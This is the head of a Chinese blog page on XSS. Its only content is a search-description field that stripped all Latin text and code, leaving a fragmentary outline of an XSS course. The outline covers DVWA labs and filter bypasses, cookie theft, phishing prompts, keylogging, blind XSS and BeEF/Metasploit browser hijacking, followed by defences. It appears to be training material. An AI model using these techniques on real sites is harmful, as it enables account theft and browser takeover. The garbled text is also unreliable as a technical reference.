<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>xss | 蜡笔小王的博客</title><meta name="keywords" content="漏洞"><meta name="author" content="蜡笔小王"><meta name="copyright" content="蜡笔小王"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="xss"><meta name="application-name" content="xss"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="xss"><meta property="og:url" content="https://wjh0527.github.io.git/2025/09/12/xss/index.html"><meta property="og:site_name" content="蜡笔小王的博客"><meta property="og:description" content="Web"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://wjh0527.github.io.git/assets/lbxw.jpg"><meta property="article:author" content="蜡笔小王"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://wjh0527.github.io.git/assets/lbxw.jpg"><meta name="description" content="Web"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://wjh0527.github.io.git/2025/09/12/xss/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="manifest" href="/manifest.json"/><meta name="msapplication-TileColor" content="var(--anzhiyu-main)"/><link rel="mask-icon" href="/img/siteicon/apple-icon-180.png" color="#5bbad5"/><link rel="apple-touch-icon" sizes="180x180" href="/img/siteicon/apple-icon-180.png"/><link rel="apple-touch-icon-precomposed" sizes="180x180" href="/img/siteicon/apple-icon-180.png"/><link rel="icon" type="image/png" sizes="32x32" href="/img/siteicon/32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/img/siteicon/16.png"/><link rel="bookmark" href="/img/siteicon/apple-icon-180.png"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2048-2732.jpg" media="(device-width: 1024px) and (device-height: 1366px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2732-2048.jpg" media="(device-width: 1024px) and (device-height: 1366px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1668-2388.jpg" media="(device-width: 834px) and (device-height: 1194px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2388-1668.jpg" media="(device-width: 834px) and (device-height: 1194px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1536-2048.jpg" media="(device-width: 768px) and (device-height: 1024px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2048-1536.jpg" media="(device-width: 768px) and (device-height: 1024px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1668-2224.jpg" media="(device-width: 834px) and (device-height: 1112px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2224-1668.jpg" media="(device-width: 834px) and (device-height: 1112px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1620-2160.jpg" media="(device-width: 810px) and (device-height: 1080px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2160-1620.jpg" media="(device-width: 810px) and (device-height: 1080px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1290-2796.jpg" media="(device-width: 430px) and (device-height: 932px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2796-1290.jpg" media="(device-width: 430px) and (device-height: 932px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1179-2556.jpg" media="(device-width: 393px) and (device-height: 852px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2556-1179.jpg" media="(device-width: 393px) and (device-height: 852px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1284-2778.jpg" media="(device-width: 428px) and (device-height: 926px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2778-1284.jpg" media="(device-width: 428px) and (device-height: 926px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1170-2532.jpg" media="(device-width: 390px) and (device-height: 844px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2532-1170.jpg" media="(device-width: 390px) and (device-height: 844px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1125-2436.jpg" media="(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2436-1125.jpg" media="(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1242-2688.jpg" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2688-1242.jpg" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-828-1792.jpg" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1792-828.jpg" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1242-2208.jpg" media="(device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-2208-1242.jpg" media="(device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-750-1334.jpg" media="(device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1334-750.jpg" media="(device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-640-1136.jpg" media="(device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"/><link rel="apple-touch-startup-image" href="/img/siteicon/apple-splash-1136-640.jpg" media="(device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"每天学习亿点点","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2024/07/27/125766904/ba62475f396df9de3316a08ed9e65d86_5680958632268053399..png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  music_page_default: "nav_music",
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: undefined,
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: 蜡笔小王","link":"链接: ","source":"来源: 蜡笔小王的博客","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: '蜡笔小王的博客',
  title: 'xss',
  postAI: '',
  pageFillDescription: 'XSS漏洞, Ø 课程内容, Ø 课程目标, 一、XSS介绍, 1.1 认识XSS, 1.2 什么是XSS跨站脚本, 1.3 XSS漏洞原理, 1.4 XSS的危害, 1.5 XSS漏洞的挖掘, 二、XSS分类, 2.1 反射型XSS, 2.1.1 反射型XSS攻击举例, 2.2.1 存储型XSS攻击举例, 2.2.2 存储型XSS攻击代码分析, 2.3 DOM型XSS, 2.3.1 DOM型XSS介绍, 2.3.2 攻击方式, 2.3.3 DOM型XSS攻击举例, 2.3.4 DOM型XSS攻击代码分析, 三、****XSS常用的语句及绕过, 3.1 XSS常用的测试语句：, 3.2 常用的绕过, 3.2.1 JS编码, 3.2.2 HTML实体编码, 3.2.3 URL编码, 四、XSS之DVWA练习实战, 4.1 DVWA之Reflected XSS(反射型XSS), 4.1.1 Low级别, 4.1.2 Medium****级别, 4.1.3 High****级别, 4.1.3 impossible级别, 4.2 DVWA之Stored XSS(存储型XSS), 4.2.1 Low级别, 4.2.2 Medium****级别, 4.2.3 High****级别, 4.2.4 impossible级别, 4.3 DVWA****之DOM XSS(DOM型跨站脚本攻击), 4.3.1 Low级别, 4.3.2 Medium级别, 4.3.3 High****级别, 4.3.4 impossible级别, 五、XSS盗取cookie实战, 5.1 XSS常用的小工具, 5.2 盗取cookie实战, 5.2.1 反射型XSS（GET）获取cookie, 5.2.2 反射型XSS（POST）获取cookie, 六、XSS-beef的使用实例, 6.1 劫持客户端浏览器, 6.2 利用beef+msf拿用户shell(基于客户端ie6 ), 6.3 利用beef+msf拿用户shell（基于客户端使用ie789 ), 七、XSS的防御, Ø 课程小结, 一、XSS漏洞盗取cookie实战, 实验一：XSS平台搭建及后台使用（盗取cookie）, 1. XSS平台搭建及后台使用, 2. 盗取cookie, 实验二：反射型XSS（POST）获取cookie, 二、XSS钓鱼用户名和密码, 三、XSS获取键盘记录, 四、XSS盲打, 五、XSS绕过, 5.1 前端代码绕过, 5.2 后端代码绕过, 5.2.1 大小写及双写绕过, 5.2.2 编码绕过, 5.2.3 XSS绕过之htmlspecialchars()函数, 5.2.4 XSS之href输出, 5.2.5 XSS之js输出, 5.2.6 XSS之httponly绕过, 5.2.6.1 什么是httponly, 5.2.6.2 各语言设置cookie的httponly, 5.2.6.3 绕过httponly, 六、XSS常规防范漏洞课程内容介绍常用的小工具盗取绕过限制的使用课程目标掌握漏洞的原理与危害了解绕过的方法掌握漏洞的利用方法一介绍认识跨站脚本自年诞生以来一直被评为十大安全漏洞中的第三威胁漏洞也有黑客把当做新型的缓冲区溢出攻击而是新型的年月份国内最火的信息发布平台新浪微博爆发了蠕虫攻击仅持续分钟感染用户近个危害十分严重最大的特点就是能注入恶意的代码到用户浏览器的网页上从而达到劫持用户会话的目的什么是跨站脚本是一种经常出现在应用程序中的计算机安全漏洞是由于应用程序对用户的输入过滤不严而产生的攻击者利用网站漏洞把恶意的脚本代码注入到网页中当其他用户浏览这些网页时就会执行其中的恶意代码对受害用户可能采用资料窃取会话劫持钓鱼欺骗等攻击手段漏洞原理攻击者在有漏洞的前端页面嵌入恶意代码导致受害者访问页面时不知情的情况下触发恶意代码获取受害者关键信息形成漏洞的原因本质上还是对输入输出的过滤限制不严格导致精心构造的脚本输入后在前端被当做有效代码并执行举例用按进入编辑器或者直接查看网页源代码寻找输入点在输入点输入特殊字符等查看是否存在拦截并且通过编辑器查看输入后存放的位置发现没有过滤特殊字符后就要考虑如何构造进行攻击了开始分析漏洞页面构建网页内容为输出后的显示箭头部分是我们可控输入的部分是一个空元素所以在元素内是无论如何不能写入内容的所以我们先要把闭合掉然后再插入我们的我们预想的弹窗语句是一个完整的元素后面跟一个新的元素标签此时的已经包含在正文的内成为可以执行的新元素那么此时弹窗语句可以顺利执行所以我们往回推为保证输入过后能成为上面的语句我们应该怎么做呢如首先输入一个将元素闭合其次将后面的内容输入即可我们尝试输入一下成功弹窗的危害网络钓鱼包括盗取各类的用户账号窃取用户窃取用户浏览请回话强制弹出广告页面刷流量网页挂马提升用户权限进一步渗透网站传播跨站脚本蠕虫等漏洞的挖掘黑盒测试尽可能找到一切用户可控并且能够输出在页面代码中的地方比如下面这些的每一个参数本身表单搜索框常见业务场景重灾区评论区留言区个人信息订单信息等针对型站内信网页即时通讯私信意见反馈存在风险搜索框当前目录图片属性等二分类攻击类型可以分为三种反射型存储型型反射型反射型与服务端交互但是交互的数据一般不会被存在数据库中一次性所见即所得一般出现在查询类页面等反射性又称非持久型这种攻击方式往往具有一次性攻击方式攻击者通过电子邮件等方式将包含代码的恶意链接发给目标用户当目标用户访问该链接时服务器接收该目标用户的请求并进行处理然后服务器把带有代码的数据发送给目标用户的浏览器浏览器解析这段带有代码的恶意脚本后浏览器解析这段代码后就会触发攻击完成攻击者想要的功能获取浏览器信息等等反射型攻击举例在输入表单中输入内容单击提交按钮后将输入的内容放到输出表单中例如当输入单击提交按钮将被输出到输出表单中当访问输出到页面的代码变成了如下所示可以看到输入的双引号闭合了属性的双引号输入的闭合了的标签导致输入的变成了标签浏览器渲染时执行了函数导致浏览器弹窗注弹框实际上并不能造成什么危害但这是我们用来测试漏洞点的一个方法标签中可以执行代码所以理论上可以做任何事在线短网址生成反射型代码分析在反射型代码中通过获取参数的值然后通过输出一个标签并将的值放入标签的中当访问时输出到页面的代码变为此段代码有两个标签标签和标签而标签的作用就是让浏览器弹窗显示代码如下储存型存储型又称持久型攻击脚本将被永久地存放在目标服务器的数据库或文件中具有很高的隐蔽性攻击方式这种攻击多见于论坛博客和留言板攻击者在发帖的过程中将恶意脚本连同正常信息一起注入帖子的内容中随着帖子被服务器存储下来恶意脚本也永久地被存放在服务器的后端存储器中当其他用户浏览这个被注入了恶意叫你本的帖子时恶意脚本会在他们的浏览器中得到执行如下恶意攻击者在留言板中加入以下代码当其他用户访问留言版时就会看到一个弹窗可以看到存储型的攻击方式能够将恶意代码永久地嵌入一个页面中所以访问这个页面的用户都将成为受害者如果我们能够谨慎对待不明链接那么反射型攻击将没有多大作为而存储型则不同由于它注入在一些我们信任的页面因此无论我们多么小心都难免会受到攻击存储型攻击举例储存型页面实现的功能是获取用户输入的留言信息标题和内容然后将标题和内容插入到数据库中并将数据库的留言信息输出到页面上当输入标题为然后将标题输出到页面时页面执行了导致弹窗此时这里的就是持久性的也就是说任何人访问该时都会导致一个显示的框存储型攻击代码分析在存储型的代码中获取参数和参数然后将参数插入数据表中接下来通过查询将表中的数据查询出来并显示到页面上当用户在标题出写入时数据库中的数据如下当将输出到页面时页面执行了导致弹窗型型介绍通过代码操作前端的节点文档对象模型时触发的漏洞一般不与后台服务器产生数据交互属于中低危漏洞浏览器在解析这种文档数据的时候将文件数据当中的代码组织成一种文档型形式这种文档就叫文档全称使用可以使程序和脚本能够动态访问和更新文档的内容结构及样式型是一种特殊类型的反射型它是基于文档对象模型的一种漏洞的标签都是节点而这些节点组成了的整体结构节点树通过树中的所有结点均可通过进行访问所有元素节点均可被修改也可以创建或删除节点树结构如下在网站页面中有许多元素当页面到达浏览器时浏览器会为页面创建一个项级的文档对象接着生成各个子文档对象每个页面元素对应一个文档对象每个文档对象包含属性方法和事件可以通过脚本对文档对象进行编辑从而修改页面的元素也就是说客户端的脚本程序可以通过动态修改页面内容从客户端获取中的数据并在本地执行由于是在客户端修改节点的所以基于型的漏洞不需要与服务器端交互它只发生在客户端处理数据的阶段攻击方式用户请求一个经过专门设计的它由攻击者提交而且其中包含代码服务器的响应不会以任何形式包含攻击者的脚本当用户的浏览器处理这个响应时对象就会处理代码导致存在漏洞可能触发型的操作如下属性属性属性属性闭合标签型攻击举例型攻击页面实现的功能是在输入框中输入信息单击替换按钮时页面会将这里会显示输入的内容替换为输入的信息如输入页面将这里显示输入的内容替换为测试地址当输入时单击替换弹窗型攻击代码分析从源码中可以看到存在函数该函数作用是通过操作将元素输出位置的内容修改为元素输入位置的内容型程序只有代码并不存在服务器段代码所以此程序并没有与服务器进行交互单击替换按钮时会执行的函数而函数是一个操作通过获取为的节点然后将节点的内容修改成为中的值即用户输入的值当输入时单击替换按钮页面弹出消息框但由于是隐式输出的所以在查看源码时看不到输出的代码三常用的语句及绕过常用的测试语句常用的绕过常见的的绕过编码有编码实体编码和编码编码提供了四种字符编码的策略如下所示三个八进制数字如果个数不够在前面补例如的编码为两个十六进制数字如果个数不够在前面补例如的编码为四个十六进制数字如果个数不够在前面补例如的编码为对于一些控制字符使用特殊的类型的转义风格例如和实体编码命名实体以开头以分号结尾如的编码是字符编码十进制十六进制码或字符编码样式为数值例如可以编码为和编码这里的编码也是两次全编码的结果如果被过滤结果为在使用编码测试时需要考虑渲染的顺序特别是针对多种编码组合时要选择合适的编码方式进行测试四之练习实战之反射型级别源代码可以看到级别的代码只是判断了参数是否为空如果不为空的话就直接打印出来并没有对参数做任何的过滤和检查存在非常明显的漏洞我们输入直接就执行了我们的代码查看源代码可以看到我们的代码已经被插入到页面中了级别源代码元素可定义预格式化的文本被包围在元素中的文本通常会保留空格和换行符而文本也会呈现为等宽字体可以看到级别的代码只是在级别上增加了对于的过滤并没有什么用我们可以直接大写绕过我们输入直接就执行了我们的代码查看源代码可以看到我们的代码虽然输入的时候是大写躲过了过滤但是最后输出的时候确是小写的级别源代码可以看到级别的代码使用了正则表达式直接把给过滤了代表一个或多个任意字符代表不区分大小写所以我们的标签在这里就不能用了但是我们可以通过等标签的事件或者等标签的注入恶意的代码我们输入上面输入的意思是当图片显示错误时然后执行这里我们的肯定显示错误啊所以就执行语句级别源代码把预定义的字符大于转换为实体防止浏览器将其作为元素可以看出级别的代码先判断是否为空不为空的话然后验证其来防范攻击然后再用函数将中的预定义字符转换成实体这样就防止了我们填入标签当我们输入时因为函数会将和转换成实体并且取的是的值然后包围在标签中被打印出来所以我们插入的语句并不会被执行我们可以查看源代码表单提交的过程中把我们的也一并提交了来和服务器端的做验证防止攻击我们输入的代码直接被当成文本给打印出来了并不会被当成脚本执行之存储型级别源代码移除字符两侧的预定义字符预定义字符包括以及空格可选参数支持添加额外需要删除的字符去除掉字符的反斜杠函数会对字符串中的特殊符号进行转义引用全局作用域中可用的全部变量这种全局变量用于在脚本中的任意位置访问全局变量从函数或方法中均可在名为的数组中存储了所有全局变量变量的名字就是数组的键可以看出级别的代码对我们输入的和并没有进行过滤而且数据存储在数据库中存在比较明显的存储型漏洞我们输入和可以看到我们的代码立即就执行了查看数据库我们的代码被插入到了数据库进行存储查看源代码可以看到位置显示的是我们的代码因为这里显示的数据是调用数据库里的数据级别源代码函数返回在预定义字符之前添加反斜杠的字符串预定义字符函数剥去字符串中的以及的标签把预定义的字符小于大于转换为实体防止浏览器将其作为元素当我们再次输入和函数把标签给剥除了函数把转义成了虽然参数把所有的都给过滤了但是参数只是过滤了标签而已我们依然可以在参数进行注入可是发现参数对长度有限制最大长度是所以我们想到了抓包然后进行篡改我们输入如下的然后抓包如下框中的数据就是经过编码后的数据我们需要将其修改为经过编码后的数据提交后就可以看到弹出此框了说明我们的代码执行了查看数据库可以看到我们的代码插入进数据库了查看页面源代码可以看到位置插入了我们的代码级别源代码可以看到级别只是在级别上参数用了正则表达式进行过滤而已我们仍然可以在参数做手脚抓包然后改包只不过这次改成我们输入如下的然后将进行编码可以看到我们的代码执行了查看数据库我们的代码被插入进数据库了查看源代码可以看到位置插入了我们的标签级别源代码可以看到这次在级别的基础上对参数也进行了更严格的过滤导致参数也无法进行攻击而且使用了防止攻击完全杜绝了漏洞和漏洞之型跨站脚本攻击级别源代码从源代码可以看出这里级别的代码没有任何的保护性措施页面本意是叫我们选择默认的语言但是对参数没有进行任何的过滤所以我们可以构造代码访问链接可以看到我们的脚本成功执行了我们查看源代码可以看到我们的脚本插入到代码中所以执行了级别源代码可以看到级别的代码先检查了参数是否为空如果不为空则将等于获取到的值这里还使用了用于检测值中是否有如果有的话则将很明显这里过滤了不区分大小写那么我们可以使用但是当我们访问此时并没有弹出任何页面我们查看网页源代码发现我们的语句被插入到了值中但是并没有插入到标签的值中所以标签并没有发起任何作用所以我们得先闭合前面的标签我们构造语句闭合标签所以我们构造该链接但是我们的语句并没有执行于是我们查看源代码发现我们的语句中只有被插入到了标签的值中因为闭合了标签所以标签并没有插入于是我们继续构造语句去闭合标签这下我们的标签就是独立的一条语句了我们构造该链接我们查看源代码可以看到我们的语句已经插入到页面中了级别级别五盗取实战常用的小工具盗取实战反射型获取实验一反射型获取第一步编写获取的代码并放在一个服务器上代码内容如下所示设置文件的权限查看运行进程的用户名同时改变文件的所有者与属组创建存的文件第二步重启服务器第三步使用普通用户构造如下并发送给被攻击者完整的但是通过这样访问因为中直接有脚本有时服务器会拒绝不成功所以我们需要对进行编码如下所示将进行编码后的地址输入网站生成短地址并发送给其他用户点击第四步在中查看信息第五步如果是管理员点击了这个链接我们就可以通获得的提升权限打开抓包并修改信息如下所示实验二平台搭建及后台使用盗取平台搭建及后台使用访问进行初始化将目录下的文件夹复制到攻击机上并修改如下代码修改数据库连接修改目录下的文件修改目录下的文件文件中的代码是用来获取用户的登录平台获取的文件是盗取测试测试是否存在漏洞构造盗取的语句并点击提交查看获取的信息由于这是个存储型所以会存储在后台数据库当其他用户只要访问到这个页面就会触发就会被盗反射型获取请求方式的攻击其实是比较难实现的因为要构造一个网页文件出来攻击利用页面构造的页面首先要以用户密码登录到网站找到存在漏洞的页面并根据页面创建一个文件已经存在根据网站页面对文件做如下修改当浏览器加载完页面所有的内容后自动触发执行最后将这个页面的访问地址发给用户一旦用户以管理员登录并点击了这个页面那么他的就会被盗如下图所示六的使用实例劫持客户端浏览器第一步安装并配置安装启动服务进入安装目录启动会提示更改默认用户名和密码在这个文件中修改用户名和密码启动此时会启动成功在浏览器输入第二步找到存在漏洞的留言板并输入以下留言构造的如下第三步用户浏览留言中招在服务器上就可以看到浏览这个页面的浏览器就被控制了使用四种颜色来标识功能的可用性绿色可以运行且用户不会感觉出异常橙色可以运行但用户可能感到异常弹窗等灰色未验证不确定是否可以使用红色不可用第四步控制浏览器访问指定的网站工作原理有一个内置的文件文件里是一些用来交互的代码我们提交的时候其实就是把这个脚本挂到了网页上挂上去以后就可以通过脚本和网页进行交互我们提交的实际上就是在页面插入了一行代码代码的内容是一个链接指向了的文件第五步社工弹窗目标登录后信息就会提交到工具中点击对应的记录就可查看提交的信息利用拿用户基于客户端第一步启动第二步配置浏览器极光漏洞第三步劫持用户浏览器找到存在漏洞的留言板并输入以下留言构造的如下用户浏览留言后在服务器上就可看到浏览这个页面的浏览器就被控制了第四步劫持浏览器后将链接发给客户端用户访问客户端计算机就会被控制第五步在机查看访问这个页面的用户电脑是否被控制利用拿用户基于客户端使用操作方法同上只是利用的漏洞不一样这里就不演示了只是给出相关的配置七的防御防御的总体思路是对用户的输入和参数进行过滤对输出进行编码也就是对用户提交的所有内容进行过滤对中的参数进行过滤过滤掉会导致脚本执行的相关内容然后对动态输出到页面的内容进行编码使脚本无法在浏览器中执行对输入的内容进行过滤可以分为黑名单过滤和白名单过滤黑名单过滤虽然可以拦截大部分的攻击但是还是存在被绕过的风险白名单过滤虽然可以基本杜绝攻击但是真实环境中一般是不能进行如此严格的白名单过滤的对输出进行编码就是通过函数将用户的输入的数据进行编码使其不能作为脚本运行如下是使用中的函数对用户输入的参数进行编码将其转换为实体使用函数对用户输入的参数进行编码将其转换为实体如下图一是没有进行编码的图是进行了编码的经过编码后标签被当成了实体我们还可以服务端设置会话的属性这样客户端的脚本就不能获取信息了修复总结因为漏洞涉及输入和输出两部分所以其修复也分两种过滤输入的数据包括等非法字符对输出到页面的数据进行相应的编码转换包括实体编码编码等课程小结在本课中我们学习了漏洞的原理漏洞的类型以及危害我们需要具备漏洞的挖掘与利用能力一漏洞盗取实战实验一平台搭建及后台使用盗取平台搭建及后台使用访问进行初始化将目录下的文件夹复制到攻击机上并修改如下代码修改数据库连接修改目录下的文件全局全局居设置时区全局设置默认字符定义数据库连接参数将修改为数据库服务器的地址将修改为连接的用户名将修改为连接的密码自定义建议不修改将修改为的连接端口默认修改目录下的文件文件中的代码是用来获取用户的这个是获取的页面重定向到一个可信的网站登录平台获取的文件是盗取盗取用户信息的页面存在漏洞的页面平台页面测试是否存在漏洞构造盗取的语句并点击提交查看获取的信息实验二反射型获取请求方式的攻击其实是比较难实现的因为要构造一个网页文件出来攻击利用页面首先要以用户密码登录到网站找到存在漏洞的页面并根据页面创建一个文件已经存在根据网站页面对文件做如下修改当浏览器加载完页面所有的内容后自动触发执行最后将这个页面的访问地址发给用户一旦用户以管理员登录并点击了这个页面那么他的就会被盗如下图所示二钓鱼用户名和密码在目录下有一个的钓鱼页面代码如下所示发送认证框并给出迷惑性的认证将结果发送给搜集信息的后台请将这里的地址修改为管理后台的在目录下有一个页面用于将从钓鱼页面获取的用户及密码存储到数据库中代码如下我们在有存储型的页面中构造以下然后其他用户访问该页面时就会提示输入用户名和密码当用户输入用户名和密码登录后刚才输入的用户名和密码就会被窃取如下图所示三获取键盘记录参考文档在目录下有一个获取解盘信息的文件其代码如下所示页面请求失败代码中将获取到的解盘信息发送给目录下的进行处理并将获取的键盘信息写入到数据库存进行保存其代码如下设置允许被跨域访问接下来我们就在具有存储型的页面构造语句如下所示当别人在访问这个页面时在这个页面的键盘输入就会被记录下来并写入到数据库如下图所示同源和跨域四盲打盲打就是攻击者在前端提交的数据不知道后台是否存在漏洞的情况下提交恶意代码在类似留言板等输入框后所展现的位置在后台网站采用了攻击者插入的恶意代码当后台管理员在操作时就会触发插入的恶意代码从而达到攻击者的目的也就是通过前端插入的攻击代码在后台管理系统中生效管理后台盲打如果插入的代码为盗取的代码那么管理员的就会被盗取如果插入的代码为钓鱼代码提示管理员重新登录那么就很可能获取管理员的后台账号密码等等五绕过防护措施前端过滤后端过滤等大多数网站为了避免的攻击对攻击者输入都采取了过滤的措施导致攻击者通常不能正常插入恶意代码来达到攻击目的但是仍存在一些漏洞可以利用来绕过过滤措施绕过的方法有很多主要取决于攻击者的思路和对前端技术的掌握以下介绍一些简单的绕过方法前端代码绕过对前端的限制可以尝试进行抓包重发或者修改前端的比如前面的示例中输入框限制只能输入个字符的那个这就是前端限制但是前端的限制对能力强的攻击者来讲都是无用的抓包改请求包或者直接在前端代码中修改等后端代码绕过大小写及双写绕过防止后台对输入的内容进行正则匹配来过滤输入对于这样的过滤可以考虑大小写混合输入的方法如目录下的源代码如下这里会使用正则对进行替换为空也就是过滤掉那就去人民广场一个人坐一会儿吧别说这些的话不要怕就是干之过滤再点一下关闭有些内容被过滤了试试看怎么绕过点一下提示阁下请问你觉得人生苦短吗其中是对小写的进行过滤此时我们可以用大写或大小写混合或其他标签的方式进行绕过或其中是对整体进行了过滤不区分大小写我们可以使用双写或其他标签进行绕过或编码绕过思路后台有可能会对代码中的关键字进行过滤但我们可以尝试将关键字进行编码后在插入浏览器对改编码进行识别时会翻译成正常的代码注意编码在输出时是否